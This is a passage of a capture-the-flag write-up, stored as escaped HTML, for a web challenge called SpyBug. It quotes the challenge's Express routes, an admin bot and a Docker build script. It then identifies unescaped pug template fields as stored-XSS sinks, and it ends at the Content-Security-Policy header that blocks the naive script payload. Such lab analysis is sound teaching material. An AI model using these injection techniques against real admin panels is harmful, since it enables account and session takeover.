+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">router&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/panel&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">authUser&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kr">async&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">res&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">render&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;panel&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">username&lt;/span>&lt;span class="o">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">session&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">username&lt;/span> &lt;span class="o">===&lt;/span> &lt;span class="s2">&amp;#34;admin&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">?&lt;/span> &lt;span class="nx">process&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">env&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">FLAG&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">:&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">session&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">username&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">agents&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="kr">await&lt;/span> &lt;span class="nx">getAgents&lt;/span>&lt;span class="p">(),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">recordings&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="kr">await&lt;/span> &lt;span class="nx">getRecordings&lt;/span>&lt;span class="p">(),&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">router&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/panel/logout&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">authUser&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">res&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">session&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">destroy&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">redirect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/panel/login&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">router&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/panel/login&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">res&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">render&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;login&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">router&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">post&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/panel/login&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kr">async&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">res&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nx">username&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">username&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nx">password&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">body&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">password&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">username&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nx">password&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="k">return&lt;/span> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sendStatus&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">400&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kr">await&lt;/span> &lt;span class="nx">checkUserLogin&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">username&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">password&lt;/span>&lt;span class="p">)))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">redirect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/panel/login&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">session&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">loggedin&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">req&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">session&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">username&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">username&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">redirect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;/panel&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">module&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">exports&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">router&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Let&amp;rsquo;s summarize what they do.&lt;/p>
+&lt;p>&lt;code>routes/agent.js&lt;/code> has register function which returns an id and a token that we can use to upload a file. And we can only upload a file with the header which is somewhat similar to &lt;code>WAV&lt;/code> file. We can also modify &lt;code>hostname&lt;/code>, &lt;code>arch&lt;/code> and &lt;code>platform&lt;/code>.&lt;/p>
+&lt;p>&lt;code>routes/panel.js&lt;/code> which only accepts credential of &lt;code>admin&lt;/code>. If the provided credential is valid, the main panel will render with the recordings that agents provide.&lt;/p>
+&lt;p>Let&amp;rsquo;s keep in mind that there is a bot being generated at every 60 seconds. This bot will login to the panel and review all panel at a context of a browser. This is no doubt an Client-Side challenge.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// index.js
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kr">const&lt;/span> &lt;span class="p">{&lt;/span> &lt;span class="nx">visitPanel&lt;/span> &lt;span class="p">}&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;./utils/adminbot&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">............&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">createAdmin&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">setInterval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">visitPanel&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">60000&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// utils/adminbot.js
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;dotenv&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">config&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">puppeteer&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">require&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;puppeteer&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kr">const&lt;/span> &lt;span class="nx">browserOptions&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">headless&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="kc">true&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">executablePath&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;/usr/bin/chromium-browser&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">args&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">[&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;--no-sandbox&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;--disable-background-networking&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;--disable-default-apps&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;--disable-extensions&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;--disable-gpu&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;--disable-sync&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;--disable-translate&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;--hide-scrollbars&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;--metrics-recording-only&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;--mute-audio&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;--no-first-run&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;--safebrowsing-disable-auto-update&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s2">&amp;#34;--js-flags=--noexpose_wasm,--jitless&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">],&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">exports&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">visitPanel&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kr">async&lt;/span> &lt;span class="p">()&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">const&lt;/span> &lt;span class="nx">browser&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kr">await&lt;/span> &lt;span class="nx">puppeteer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">launch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">browserOptions&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nx">context&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kr">await&lt;/span> &lt;span class="nx">browser&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">createIncognitoBrowserContext&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">let&lt;/span> &lt;span class="nx">page&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kr">await&lt;/span> &lt;span class="nx">context&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">newPage&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="kr">goto&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;http://0.0.0.0:&amp;#34;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="nx">process&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">env&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">API_PORT&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">waitUntil&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s2">&amp;#34;networkidle2&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">timeout&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="mi">5000&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">type&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;#username&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;admin&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">type&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;#password&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">process&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">env&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ADMIN_SECRET&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">click&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;#loginButton&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">page&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">waitForTimeout&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">5000&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">await&lt;/span> &lt;span class="nx">browser&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">close&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span> &lt;span class="k">catch&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">console&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">e&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Well since I really wanted to know how the recordings being rendered. I will create a Docker. For those who are new to CTFs, Docker is a good way to debug what really happens behind the curtain.&lt;/p>
+&lt;p>For the purpose of testing I will modify &lt;code>./build-docker.sh&lt;/code> to&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#!/bin/bash
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>docker stop web_spybug
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker rm web_spybug
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker rmi &lt;span class="k">$(&lt;/span>docker images -f &lt;span class="nv">dangling&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nb">true&lt;/span> -q&lt;span class="k">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker rmi &lt;span class="k">$(&lt;/span>docker images -q web_spybug&lt;span class="k">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker build --tag&lt;span class="o">=&lt;/span>web_spybug .
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker run -p 1337:1337 -e &lt;span class="nv">API_PORT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="m">1337&lt;/span> -e &lt;span class="nv">FLAG&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;HTB{f4k3_fl4g_f0r_t3st1ng}&amp;#34;&lt;/span> -e &lt;span class="nv">SESSION_SECRET&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$(&lt;/span>cat /dev/urandom &lt;span class="p">|&lt;/span> tr -dc &lt;span class="s1">&amp;#39;a-zA-Z0-9&amp;#39;&lt;/span> &lt;span class="p">|&lt;/span> fold -w &lt;span class="m">32&lt;/span> &lt;span class="p">|&lt;/span> head -n 1&lt;span class="k">)&lt;/span> -e &lt;span class="nv">ADMIN_SECRET&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;admin&amp;#34;&lt;/span> web_spybug
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>I changed the admin password from randomly generated 32 characters string to &lt;code>admin&lt;/code>. Let&amp;rsquo;s build and run the docker using command
+&lt;code>./build-docker.sh&lt;/code>&lt;/p>
+&lt;p>While waiting our docker finishes building and runs. Let&amp;rsquo;s look at how are we able to perform such Client-Side XSS attack. Let&amp;rsquo;s look at the template &lt;code>views/panel.pug&lt;/code>, we will find 2 places that we can place our payload.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">if agents.length &amp;gt; 0
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> table.w-100
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> thead
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> tr
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> th ID
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> th Hostname
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> th Platform
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> th Arch
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> tbody
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> each agent in agents
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> tr
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> td= agent.identifier
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> td !{agent.hostname}
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> td !{agent.platform}
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> td !{agent.arch}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">tbody
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> each recording in recordings
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> tr
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> td= recording.agentId
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> td
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> audio(controls=&amp;#39;&amp;#39;)
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> source(src=recording.filepath)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The first flashes through my mind is &lt;code>!{agent.hostname}&lt;/code>, &lt;code>!{agent.platform}&lt;/code> and &lt;code>!{agent.arch}&lt;/code>. Upon reading the &lt;code>pug/jade&lt;/code> document&lt;/p>
+&lt;img src="spybug1.png" alt="jade document"/>
+&lt;p>Aaaaaah, so no escape then, so we just need to fix the &lt;code>hostname&lt;/code> or &lt;code>platform&lt;/code> or &lt;code>arch&lt;/code> to &lt;code>&amp;lt;script&amp;gt;(evil xss)&amp;lt;/script&amp;gt;&lt;/code> right ? Unfortunately, it won&amp;rsquo;t work. Let&amp;rsquo;s look at the &lt;code>index.js&lt;/code> again.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">application&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">use&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">req&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">res&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">next&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">setHeader&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Content-Security-Policy&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;script-src &amp;#39;self&amp;#39;; frame-ancestors &amp;#39;none&amp;#39;; object-src &amp;#39;none&amp;#39;; base-uri &amp;#39;none&amp;#39;;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">res&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">setHeader&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Cache-Control&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;no-cache, no-store, must-revalidate&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
